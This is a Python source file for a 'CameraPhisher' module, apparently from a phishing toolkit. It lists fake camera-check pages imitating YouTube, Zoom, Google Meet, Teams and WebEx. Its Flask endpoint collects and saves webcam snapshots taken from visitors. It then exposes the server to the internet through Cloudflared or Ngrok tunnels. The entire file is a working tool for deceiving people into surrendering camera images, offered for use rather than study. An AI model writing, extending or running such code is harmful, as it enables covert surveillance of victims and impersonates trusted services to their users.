#!/usr/bin/env python3

import os
import json
import datetime
import subprocess
import platform
from flask import Flask, request, render_template, redirect, session, jsonify
from rich.console import Console
from rich.prompt import Prompt
from rich.panel import Panel
import threading
import time
import socket
from rich.table import Table
from rich import box

console = Console()

class CameraPhisher:
    def __init__(self):
        self.templates_base = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'templates')
        self.app = Flask(__name__, 
                        template_folder=self.templates_base,
                        static_folder=os.path.join(os.path.dirname(os.path.dirname(__file__)), 'static'))
        self.app.secret_key = os.urandom(24)
        self.templates_dir = os.path.join(self.templates_base, 'camera')
        self.output_dir = 'output/camera'
        self.settings = {}
        self.selected_template = None
        self._ensure_directories()
        self.setup_routes()
        self.server_thread = None
        self.cloudflared_process = None
        self.ngrok_process = None

    def _ensure_directories(self):
        """Ensure all required directories exist."""
        os.makedirs(self.templates_dir, exist_ok=True)
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Create template-specific directories
        templates = [
            'youtube', 'zoom', 'meet', 'teams', 'webex',
            'streaming', 'conference', 'video_player'
        ]
        for template in templates:
            template_dir = os.path.join(self.templates_dir, template)
            os.makedirs(template_dir, exist_ok=True)

    def setup_routes(self):
        """Setup Flask routes."""
        
        @self.app.route('/')
        def index():
            template = request.args.get('template', self.selected_template)
            if not template:
                return render_template('camera/error.html',
                                    error="Select a Template",
                                    message="Available templates: youtube, zoom, meet, teams, webex")
            
            try:
                template_path = f'camera/{template}/index.html'
                if not os.path.exists(os.path.join(self.templates_base, template_path)):
                    return render_template('camera/error.html',
                                        error=f"Template '{template_path}' not found",
                                        message="The requested template is not available.")
                
                return render_template(template_path, template=template)
            except Exception as e:
                console.print(f"[red]Error loading template: {str(e)}[/red]")
                return render_template('camera/error.html',
                                    error="Internal Server Error",
                                    message=str(e))

        @self.app.route('/camera/capture', methods=['POST'])
        def capture():
            try:
                data = request.get_json()
                if not data or 'image' not in data:
                    return jsonify({'status': 'error', 'message': 'No image data received'})

                # Save the captured image
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"capture_{timestamp}.jpg"
                filepath = os.path.join(self.output_dir, filename)

                # Remove the "data:image/jpeg;base64," prefix and save
                image_data = data['image'].split(',')[1]
                import base64
                with open(filepath, 'wb') as f:
                    f.write(base64.b64decode(image_data))

                console.print(f"[green]✓ Captured camera image saved to: {filepath}[/green]")
                return jsonify({'status': 'success', 'message': 'Image captured successfully'})

            except Exception as e:
                console.print(f"[red]Error capturing image: {str(e)}[/red]")
                return jsonify({'status': 'error', 'message': str(e)})

    def _wait_for_server(self, port, timeout=10):
        """Wait for the server to start."""
        start_time = time.time()
        while time.time() - start_time < timeout:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect(('localhost', port))
                    return True
            except:
                time.sleep(0.1)
        return False

    def _find_available_port(self, start_port=8080, max_attempts=100):
        """Find an available port to use."""
        port = start_port
        while port < start_port + max_attempts:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.bind(('', port))
                    return port
            except OSError:
                port += 1
        raise RuntimeError("No available ports found")

    def start_server(self, host='0.0.0.0', port=8080):
        """Start the Flask server."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind((host, port))
                s.close()
            
            console.print(f"[green]Starting server on {host}:{port}...[/green]")
            self.app.run(host=host, port=port, debug=False)
        except Exception as e:
            console.print(f"[red]Failed to start server: {str(e)}[/red]")
            raise e

    def run(self):
        """Run the camera phishing module."""
        try:
            # Show template options in a table
            table = Table(
                title="[bold red]Available Camera Phishing Templates[/bold red]",
                show_header=True,
                header_style="bold magenta",
                box=box.DOUBLE_EDGE,
                border_style="bright_green",
                padding=(1, 2)
            )
            
            table.add_column("[cyan]ID[/cyan]", style="cyan", justify="center", width=6)
            table.add_column("[green]Template[/green]", style="green", width=20)
            table.add_column("[yellow]Description[/yellow]", style="yellow")
            
            templates = [
                ("1", "YouTube", "Fake video player requesting camera access"),
                ("2", "Zoom", "Zoom meeting waiting room camera check"),
                ("3", "Meet", "Google Meet pre-meeting camera test"),
                ("4", "Teams", "Microsoft Teams camera setup"),
                ("5", "WebEx", "Cisco WebEx camera configuration"),
                ("6", "Streaming", "Live streaming platform camera setup"),
                ("7", "Conference", "Generic conference platform camera check"),
                ("8", "Video Player", "HTML5 video player with camera access")
            ]
            
            for id_num, name, desc in templates:
                table.add_row(
                    f"[bold cyan]{id_num}[/bold cyan]",
                    f"[bright_green]{name}[/bright_green]",
                    f"[yellow]{desc}[/yellow]"
                )
            
            panel = Panel(
                table,
                title="[bold yellow]≫ Select Camera Phishing Template ≪[/bold yellow]",
                border_style="bright_green",
                box=box.HEAVY_EDGE,
                padding=(1, 2)
            )
            
            console.print("\n")
            console.print(panel)
            console.print("\n")
            
            # Template selection
            while True:
                try:
                    choice = Prompt.ask(
                        "[bold green]Select template ID[/bold green]",
                        choices=[str(i) for i in range(1, 9)],
                        show_choices=False
                    )
                    
                    template_map = {
                        "1": "youtube",
                        "2": "zoom",
                        "3": "meet",
                        "4": "teams",
                        "5": "webex",
                        "6": "streaming",
                        "7": "conference",
                        "8": "video_player"
                    }
                    
                    self.selected_template = template_map[choice]
                    console.print(f"\n[bold green]Selected template: {self.selected_template.upper()}[/bold green]")
                    break
                    
                except KeyboardInterrupt:
                    raise
                except Exception as e:
                    console.print("[red]Invalid choice. Please enter a number between 1 and 8.[/red]")
            
            # Verify template directory exists
            template_dir = os.path.join(self.templates_dir, self.selected_template)
            if not os.path.exists(template_dir):
                console.print(f"[red]Error: Template directory for {self.selected_template} not found![/red]")
                return
            
            # Find available port
            port = self._find_available_port()
            if not port:
                console.print("[red]Error: No available ports found![/red]")
                return
            
            console.print(f"[green]Found available port: {port}[/green]")
            
            # Start the Flask server in a separate thread
            server_thread = threading.Thread(
                target=self.start_server,
                kwargs={'port': port}
            )
            server_thread.daemon = True
            server_thread.start()
            
            # Wait for server to be ready
            if not self._wait_for_server(port):
                console.print("[red]Failed to start server[/red]")
                return
            
            console.print(f"[green]Server started successfully on port {port}[/green]")
            
            # Show tunnel options
            tunnel_table = Table(title="Tunneling Services", show_header=True, header_style="bold magenta")
            tunnel_table.add_column("ID", style="cyan", justify="center")
            tunnel_table.add_column("Service", style="green")
            tunnel_table.add_row("1", "Cloudflared")
            tunnel_table.add_row("2", "Ngrok")
            console.print(tunnel_table)
            
            tunnel_choice = Prompt.ask(
                "\nChoose tunnel service",
                choices=["1", "2"],
                default="1",
                show_choices=False
            )
            
            # Start selected tunnel service
            if tunnel_choice == "1":
                from modules.social_phisher import SocialPhisher
                social_phisher = SocialPhisher()
                if social_phisher.start_cloudflared(port, self.selected_template, platform_module=platform):
                    console.print("[green]Cloudflared tunnel started successfully[/green]")
                else:
                    console.print("[red]Failed to start Cloudflared tunnel[/red]")
                    return
            else:
                from modules.social_phisher import SocialPhisher
                social_phisher = SocialPhisher()
                if not social_phisher.start_ngrok(port, self.selected_template, platform_module=platform):
                    console.print("[red]Failed to start Ngrok tunnel[/red]")
                    return
            
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                console.print("\n[yellow]Stopping server...[/yellow]")
                if tunnel_choice == "1":
                    social_phisher.stop_tunnels()
                console.print("[green]Server stopped successfully[/green]")
                
        except KeyboardInterrupt:
            console.print("\n[yellow]Operation cancelled by user[/yellow]")
        except Exception as e:
            console.print(f"[red]An error occurred: {str(e)}[/red]") 